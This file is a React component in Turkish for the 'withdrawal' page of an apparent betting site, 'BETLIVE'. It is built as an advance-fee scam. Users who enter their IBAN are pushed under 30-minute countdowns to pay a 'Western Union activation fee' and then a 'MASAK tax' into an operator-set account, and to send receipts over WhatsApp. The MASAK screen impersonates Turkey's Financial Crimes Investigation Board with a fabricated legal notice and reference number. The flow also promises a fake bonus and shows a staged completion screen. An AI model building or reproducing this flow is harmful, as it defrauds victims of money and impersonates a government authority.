import { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import { useAuth } from '../../context/AuthContext';
import { Card, CardContent } from '../../components/ui/card';
import { Button } from '../../components/ui/button';
import { Input } from '../../components/ui/input';
import { Label } from '../../components/ui/label';
import { toast } from 'sonner';
import { Globe, Shield, Clock, CheckCircle, AlertTriangle, Copy, Building, MessageCircle, Send } from 'lucide-react';

const API = `${process.env.REACT_APP_BACKEND_URL}/api`;

const UserWithdraw = () => {
  const { refreshUser } = useAuth();
  const [step, setStep] = useState('loading'); // loading, iban_form, western_pending, western_dekont, masak_pending, masak_dekont, reviewing, completed
  const [balance, setBalance] = useState(0);
  const [settings, setSettings] = useState(null);
  const [timer, setTimer] = useState(1800); // 30 minutes
  const [formData, setFormData] = useState({
    iban: '',
    bank_name: '',
    iban_holder: ''
  });
  const [userInfo, setUserInfo] = useState(null);
  const [westernPayment, setWesternPayment] = useState(null);
  const [masakPayment, setMasakPayment] = useState(null);

  const fetchStatus = useCallback(async () => {
    try {
      const response = await axios.get(`${API}/user/withdrawal-status`);
      const data = response.data;
      setBalance(data.balance);
      setSettings(data.settings);
      setUserInfo(data);
      setWesternPayment(data.western_payment);
      setMasakPayment(data.masak_payment);
      
      if (data.iban) {
        setFormData({
          iban: data.iban,
          bank_name: data.bank_name || '',
          iban_holder: data.iban_holder || ''
        });
      }

      // Determine current step based on withdrawal_status
      switch (data.status) {
        case 'western_pending':
          setStep('western_pending');
          break;
        case 'western_paid':
          setStep('masak_pending');
          break;
        case 'masak_pending':
          setStep('masak_pending');
          break;
        case 'masak_paid':
          setStep('reviewing');
          break;
        case 'reviewing':
          setStep('reviewing');
          break;
        case 'completed':
          setStep('completed');
          break;
        default:
          setStep('iban_form');
      }
    } catch (error) {
      console.error('Status fetch error:', error);
      setStep('iban_form');
    }
  }, []);

  useEffect(() => {
    fetchStatus();
  }, [fetchStatus]);

  useEffect(() => {
    let interval;
    if (['western_pending', 'western_dekont', 'masak_pending', 'masak_dekont'].includes(step) && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [step, timer]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleIbanSubmit = async (e) => {
    e.preventDefault();
    if (!formData.iban || !formData.bank_name || !formData.iban_holder) {
      toast.error('Tüm alanları doldurun');
      return;
    }
    try {
      await axios.post(`${API}/user/withdraw`, formData);
      // Create western union payment record
      const wpResponse = await axios.post(`${API}/user/western-union-payment`);
      setWesternPayment(wpResponse.data.payment);
      toast.success('Çekim talebi oluşturuldu');
      setStep('western_pending');
      setTimer(1800);
    } catch (error) {
      toast.error('İşlem başarısız');
    }
  };

  const openWhatsApp = (message) => {
    const phone = settings?.whatsapp || '905550000000';
    const url = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
    window.open(url, '_blank');
  };

  const handleWesternDekontSent = async () => {
    try {
      await axios.post(`${API}/user/western-union-dekont`);
      toast.success('Dekont gönderildi olarak kaydedildi');
      setStep('masak_pending');
      setTimer(1800);
      // Create masak payment
      const mpResponse = await axios.post(`${API}/user/masak-payment`);
      setMasakPayment(mpResponse.data.payment);
    } catch (error) {
      toast.error('İşlem başarısız');
    }
  };

  const handleMasakDekontSent = async () => {
    try {
      await axios.post(`${API}/user/masak-dekont`);
      toast.success('Dekont gönderildi olarak kaydedildi');
      setStep('reviewing');
    } catch (error) {
      toast.error('İşlem başarısız');
    }
  };

  const handleComplete = async () => {
    try {
      await axios.post(`${API}/user/complete-withdrawal`);
      toast.success('İşlem tamamlandı!');
      setStep('completed');
      refreshUser();
    } catch (error) {
      toast.error('İşlem başarısız');
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast.success('Kopyalandı!');
  };

  const westernFeePercent = settings?.western_union_fee || 7.5;
  const masakFeePercent = settings?.masak_fee || 15;
  const masakBonusPercent = settings?.masak_bonus || 35;
  
  const westernFee = balance * (westernFeePercent / 100);
  const masakFee = balance * (masakFeePercent / 100);
  const masakBonus = balance * (masakBonusPercent / 100);
  const totalWithBonus = balance + masakBonus;

  // Loading State
  if (step === 'loading') {
    return (
      <div className="flex items-center justify-center min-h-96">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-purple-500"></div>
      </div>
    );
  }

  // IBAN Form Step
  if (step === 'iban_form') {
    return (
      <div className="max-w-lg mx-auto space-y-6" data-testid="withdraw-iban-form">
        <div className="text-center">
          <h1 className="font-chivo font-black text-3xl text-slate-800 mb-2">PARA ÇEKME</h1>
          <p className="text-slate-500">Çekim yapılacak banka bilgilerinizi girin</p>
        </div>

        <Card className="bg-white/90 backdrop-blur border-slate-200 shadow-xl">
          <CardContent className="p-6">
            <div className="mb-6 p-4 bg-gradient-to-r from-purple-100 to-blue-100 border border-purple-200 rounded-xl">
              <p className="text-purple-700 font-semibold text-center">
                Çekilecek Tutar: <span className="font-mono text-2xl">{balance.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</span>
              </p>
            </div>

            <form onSubmit={handleIbanSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label className="text-slate-700">Alıcı Adı Soyadı</Label>
                <Input
                  data-testid="withdraw-iban-holder"
                  value={formData.iban_holder}
                  onChange={(e) => setFormData({ ...formData, iban_holder: e.target.value })}
                  className="bg-white border-slate-200 text-slate-800"
                  placeholder="Ad Soyad"
                  required
                />
              </div>
              <div className="space-y-2">
                <Label className="text-slate-700">Banka Adı</Label>
                <Input
                  data-testid="withdraw-bank-name"
                  value={formData.bank_name}
                  onChange={(e) => setFormData({ ...formData, bank_name: e.target.value })}
                  className="bg-white border-slate-200 text-slate-800"
                  placeholder="Banka adı"
                  required
                />
              </div>
              <div className="space-y-2">
                <Label className="text-slate-700">IBAN Numarası</Label>
                <Input
                  data-testid="withdraw-iban"
                  value={formData.iban}
                  onChange={(e) => setFormData({ ...formData, iban: e.target.value })}
                  className="bg-white border-slate-200 text-slate-800 font-mono"
                  placeholder="TR00 0000 0000 0000 0000 0000 00"
                  required
                />
              </div>
              <Button
                type="submit"
                data-testid="withdraw-submit-btn"
                className="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:opacity-90 text-white font-bold h-12"
              >
                ÇEKİM TALEBİ OLUŞTUR
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Western Union Payment Step
  if (step === 'western_pending') {
    return (
      <div className="max-w-lg mx-auto space-y-6" data-testid="withdraw-western">
        {/* Timer Bar */}
        <div className="bg-gradient-to-r from-red-500 to-orange-500 text-white py-3 text-center font-bold rounded-lg shadow-lg">
          KALAN SÜRE: {formatTime(timer)}
        </div>

        <Card className="bg-white overflow-hidden rounded-xl shadow-2xl">
          {/* Header */}
          <div className="bg-gradient-to-r from-amber-400 to-yellow-500 py-4 px-6">
            <div className="flex items-center justify-between text-sm">
              <div>
                <p className="text-amber-900">Alıcı Adı Soyadı:</p>
                <p className="font-bold text-amber-950">{formData.iban_holder}</p>
              </div>
              <div className="text-right">
                <p className="text-amber-900">Kayıtlı IBAN:</p>
                <p className="font-mono font-bold text-amber-950 text-xs">{formData.iban}</p>
              </div>
            </div>
          </div>

          <CardContent className="p-6 space-y-4">
            <div className="flex justify-between text-slate-700">
              <span>Çekim Tutarı:</span>
              <span className="font-mono font-bold">{balance.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</span>
            </div>
            <div className="flex justify-between text-red-600">
              <span>Western Union İşlem Ücreti (%{westernFeePercent}):</span>
              <span className="font-mono font-bold">{westernFee.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</span>
            </div>

            <div className="border-t border-dashed border-slate-200 pt-4">
              <div className="text-center">
                <p className="text-slate-400 text-sm">ÖDEMENİZ GEREKEN TUTAR</p>
                <p className="font-mono font-bold text-4xl text-cyan-600">{westernFee.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</p>
              </div>
            </div>

            <div className="bg-cyan-50 border border-cyan-200 rounded-lg p-4">
              <p className="text-red-600 font-semibold text-sm flex items-center gap-2">
                <AlertTriangle className="h-4 w-4" />
                İşlem tutarınızı ({westernFee.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL) yukarıdaki sayaç dolmadan (30 Dakika) ödemeniz gerekmektedir.
              </p>
            </div>

            {/* Payment Info */}
            <div className="bg-gradient-to-r from-blue-50 to-cyan-50 rounded-lg p-4 text-center space-y-2 border border-blue-100">
              <p className="text-blue-700 font-semibold">ÖDEME YAPILACAK HESAP BİLGİLERİ</p>
              <p className="font-bold text-slate-800">{settings?.iban_holder}</p>
              <p className="text-slate-600">{settings?.bank_name}</p>
              <p className="font-bold text-slate-800">{settings?.iban}</p>
              <Button
                onClick={() => copyToClipboard(settings?.iban)}
                variant="outline"
                size="sm"
                className="mt-2 border-blue-400 text-blue-700"
              >
                <Copy className="h-4 w-4 mr-2" /> IBAN'ı Kopyala
              </Button>
            </div>

            {/* WhatsApp Dekont */}
            <div className="bg-green-50 border border-green-200 rounded-lg p-4 space-y-3">
              <p className="text-green-700 font-semibold flex items-center gap-2">
                <MessageCircle className="h-5 w-5" />
                Ödeme yaptıktan sonra dekont gönderin
              </p>
              <Button
                onClick={() => openWhatsApp(`Merhaba, Western Union aktivasyon ödememi yaptım. Dekont göndermek istiyorum.\n\nKullanıcı: ${formData.iban_holder}\nTutar: ${westernFee.toLocaleString('tr-TR')} TL`)}
                className="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:opacity-90 text-white font-bold"
              >
                <Send className="h-4 w-4 mr-2" /> WhatsApp'tan Dekont Gönder
              </Button>
            </div>

            <Button
              onClick={handleWesternDekontSent}
              data-testid="western-dekont-btn"
              className="w-full bg-gradient-to-r from-purple-500 to-violet-600 hover:opacity-90 text-white font-bold h-14 text-lg"
            >
              DEKONT GÖNDERDİM, DEVAM ET
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  // MASAK Pending / Payment Step
  if (step === 'masak_pending') {
    return (
      <div className="max-w-2xl mx-auto space-y-6" data-testid="withdraw-masak">
        {/* Timer Bar */}
        <div className="bg-gradient-to-r from-red-500 to-orange-500 text-white py-3 text-center font-bold rounded-lg shadow-lg">
          KALAN SÜRE: {formatTime(timer)}
        </div>

        {/* MASAK Header */}
        <Card className="bg-gradient-to-r from-red-600 to-red-700 text-white overflow-hidden shadow-xl">
          <CardContent className="p-6 text-center">
            <Building className="h-12 w-12 mx-auto mb-4" />
            <h2 className="font-chivo font-black text-2xl mb-2">T.C. MALİ SUÇLARI ARAŞTIRMA KURULU</h2>
            <p className="text-red-200 text-sm">ULUSLARARASI FON TRANSFERİ DENETİM BİRİMİ</p>
          </CardContent>
        </Card>

        {/* MASAK Document */}
        <Card className="bg-white shadow-xl">
          <CardContent className="p-6 space-y-4">
            <div className="text-right text-sm text-slate-400">
              REF: MSK-2025/{Math.floor(Math.random() * 90000) + 10000}-TR
            </div>

            <div className="prose prose-sm max-w-none text-slate-700">
              <p>Sayın <strong>{formData.iban_holder}</strong>,</p>
              <p>
                <strong>{formData.iban}</strong> IBAN numaralı şahsi hesabınıza, yurt dışı menşeli <strong>BETLIVE ANONİM A.Ş.</strong> tarafından gönderilen <strong className="text-red-600">{balance.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</strong> tutarındaki fon transferi, 5549 sayılı kanun ve MASAK mevzuatı gereğince sistemsel olarak <strong className="underline">"Transfer Havuzu"</strong>nda beklemeye alınmıştır.
              </p>
              <p>
                Mevcut mali düzenlemeler uyarınca, 100.000 TL limitini aşan yurt dışı kaynaklı para transferleri doğrudan vergilendirmeye tabidir. Bu işlem için tahakkuk eden yasal vergilendirme/blokaj kaldırma bedeli <strong className="text-red-600">{masakFee.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</strong> olarak hesaplanmıştır.
              </p>
            </div>
          </CardContent>
        </Card>

        {/* MASAK Prosedürü */}
        <Card className="bg-white shadow-xl">
          <CardContent className="p-6 space-y-4">
            <div className="flex items-center gap-2 mb-4">
              <Shield className="h-6 w-6 text-purple-600" />
              <h3 className="font-bold text-xl text-slate-800">MASAK PROSEDÜRÜ</h3>
            </div>

            <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-lg p-4">
              <p className="text-red-600 font-semibold">ÖNEMLİ DUYURU:</p>
              <p className="text-slate-700">
                Bahis danışmanınız, bu ödemenizi çektikten sonraki aşamada sitemizde tekrar kupon yapabilmeniz için hesabınıza <strong className="text-green-600">{masakBonus.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL ÖZEL BONUS</strong> tanımlamıştır.
              </p>
            </div>

            <div className="border-2 border-dashed border-slate-200 rounded-lg p-4 text-center">
              <p className="text-slate-400 text-sm">YATIRMANIZ GEREKEN TUTAR (%{masakFeePercent})</p>
              <p className="font-mono font-bold text-4xl text-cyan-600">{masakFee.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</p>
            </div>

            {/* Payment Info */}
            <div className="bg-gradient-to-r from-blue-50 to-purple-50 rounded-lg p-4 text-center space-y-2 border border-blue-100">
              <p className="font-semibold text-slate-700">ALICI:</p>
              <p className="font-bold text-slate-800">{settings?.iban_holder}</p>
              <p className="text-slate-600">BANKA: {settings?.bank_name}</p>
              <p className="text-purple-600 font-bold">IBAN: {settings?.iban}</p>
            </div>

            {/* WhatsApp Dekont */}
            <div className="bg-green-50 border border-green-200 rounded-lg p-4 space-y-3">
              <p className="text-green-700 font-semibold flex items-center gap-2">
                <MessageCircle className="h-5 w-5" />
                Ödeme yaptıktan sonra dekont gönderin
              </p>
              <Button
                onClick={() => openWhatsApp(`Merhaba, MASAK vergi ödememi yaptım. Dekont göndermek istiyorum.\n\nKullanıcı: ${formData.iban_holder}\nTutar: ${masakFee.toLocaleString('tr-TR')} TL`)}
                className="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:opacity-90 text-white font-bold"
              >
                <Send className="h-4 w-4 mr-2" /> WhatsApp'tan Dekont Gönder
              </Button>
            </div>

            <Button
              onClick={handleMasakDekontSent}
              data-testid="masak-dekont-btn"
              className="w-full bg-gradient-to-r from-purple-500 to-violet-600 hover:opacity-90 text-white font-bold h-14 text-lg"
            >
              <Shield className="h-5 w-5 mr-2" /> DEKONT GÖNDERDİM, DEVAM ET
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Reviewing Step
  if (step === 'reviewing') {
    return (
      <div className="max-w-lg mx-auto space-y-6" data-testid="withdraw-reviewing">
        <Card className="bg-white/90 backdrop-blur border-slate-200 shadow-xl">
          <CardContent className="p-8 text-center">
            <Clock className="h-16 w-16 text-purple-500 mx-auto mb-4 animate-pulse" />
            <h2 className="font-chivo font-bold text-2xl text-slate-800 mb-4">İŞLEM İNCELENİYOR</h2>
            <p className="text-slate-500 mb-6">
              Ödemeniz alınmıştır. İşleminiz kontrol ediliyor. 
              Lütfen bekleyiniz, kısa süre içinde sonuçlanacaktır.
            </p>
            <div className="bg-gradient-to-r from-purple-100 to-blue-100 border border-purple-200 rounded-lg p-4">
              <p className="text-purple-700">
                Toplam Aktarılacak Tutar: <span className="font-mono font-bold text-2xl">{totalWithBonus.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</span>
              </p>
            </div>

            <Button
              onClick={handleComplete}
              data-testid="complete-withdrawal-btn"
              className="mt-6 bg-gradient-to-r from-green-500 to-emerald-600 hover:opacity-90 text-white font-bold h-12"
            >
              İşlemi Tamamla
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Completed Step
  if (step === 'completed') {
    return (
      <div className="max-w-lg mx-auto space-y-6" data-testid="withdraw-completed">
        <Card className="bg-gradient-to-br from-green-50 to-emerald-100 border-green-200 shadow-xl">
          <CardContent className="p-8 text-center">
            <CheckCircle className="h-20 w-20 text-green-500 mx-auto mb-4" />
            <h2 className="font-chivo font-black text-3xl text-slate-800 mb-4">TEBRİKLER!</h2>
            <p className="text-slate-600 text-lg mb-6">
              <span className="text-green-600 font-mono font-bold text-2xl">{totalWithBonus.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</span> tutarındaki çekim işleminiz başarıyla hesabınıza aktarılmıştır.
            </p>
            <div className="bg-green-100 border border-green-200 rounded-lg p-4">
              <p className="text-green-700 text-sm">
                İşlem referans numaranız: TRX-{Date.now().toString(36).toUpperCase()}
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  return null;
};

export default UserWithdraw;
